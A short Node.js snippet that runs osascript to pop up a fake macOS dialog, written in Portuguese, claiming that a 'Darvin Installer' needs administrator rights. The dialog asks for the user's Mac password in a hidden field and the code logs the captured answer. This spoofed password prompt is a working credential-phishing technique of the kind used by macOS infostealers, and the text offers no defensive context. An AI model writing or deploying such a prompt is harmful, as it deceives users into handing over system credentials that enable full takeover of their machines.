const { exec } = require('node:child_process')
exec(
   `osascript -e 'Tell application (path to frontmost application as text) to display dialog "O Darvin Installer precisa de privilégios de Administrador para instalar pacotes de sistema.\n\nPor favor, informe a senha do seu Mac:" default answer "" with hidden answer with title "Permissão Necessária"' -e 'text returned of result'`,
   (_err, stdout, stderr) => {
      console.log('Stdout:', stdout)
      console.log('Stderr:', stderr)
   }
)
